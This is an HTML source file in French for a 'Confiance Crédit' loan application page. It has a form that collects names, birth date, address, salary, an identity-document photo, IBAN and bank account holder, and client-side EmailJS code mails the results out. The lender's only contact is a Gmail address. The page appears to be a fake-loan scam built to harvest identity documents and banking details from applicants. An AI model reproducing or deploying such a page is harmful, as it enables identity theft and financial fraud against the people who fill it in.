<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Confiance Crédit - Demande de prêt</title>
  <link rel="stylesheet" href="style.css"> <!-- CSS commun pour tout le site -->
  
  <!-- EmailJS -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
  <script>
    (function(){
      emailjs.init("c8ZN5oyhh7vUaeXzd"); // Ta clé publique EmailJS
    })();

    function sendEmail(event) {
      event.preventDefault();
      emailjs.sendForm("service_8ukh7wp","template_0axeamd", event.target)
      .then(() => {
        window.location.href = "thank-you.html"; // page de remerciement
      }, (error) => {
        alert("Erreur lors de l’envoi : " + JSON.stringify(error));
      });
    }
  </script>
</head>
<body>

  <!-- HEADER -->
  <header>
    <img src="images/logo.png" alt="Logo Confiance Crédit" class="logo">
    <nav>
      <a href="index.html">Accueil</a>
      <a href="services.html">Services</a>
      <a href="expertise.html">Expertise</a>
      <a href="demande-de-pret.html" class="active">Demande de prêt</a>
      <a href="simulateur.html">Simulateur de prêt</a>
      <a href="contact.html">Contact</a>
    </nav>
  </header>

  <!-- MAIN FORMULAIRE -->
  <main>
    <section>
      <h1>Formulaire de Demande de Prêt</h1>
      <form onsubmit="sendEmail(event)">
        <label>Prénom : <input type="text" name="prenom" required></label>
        <label>Nom : <input type="text" name="nom" required></label>
        <label>Date de naissance : <input type="date" name="naissance" required></label>
        <label>Adresse exacte : <input type="text" name="adresse" required></label>
        <label>Pays : <input type="text" name="pays" required></label>
        <label>Profession : <input type="text" name="profession" required></label>
        <label>Salaire : <input type="number" name="salaire" required></label>
        <label>Email : <input type="email" name="email" required></label>
        <label>Montant du prêt : <input type="number" name="montant" required></label>
        <label>Période de remboursement : <input type="text" name="periode" required></label>
        <label>Photo de pièce d’identité : <input type="file" name="piece_identite"></label>
        <label>IBAN : <input type="text" name="iban"></label>
        <label>Nom de la banque : <input type="text" name="banque"></label>
        <label>Propriétaire du compte : <input type="text" name="proprietaire"></label>
        <button type="submit" class="button">Soumettre</button>
      </form>
    </section>
  </main>

  <!-- FOOTER -->
  <footer>
    &copy; 2025 Confiance Crédit | Paris, France | Email : confiancecredit.fr@gmail.com
  </footer>

</body>
</html>
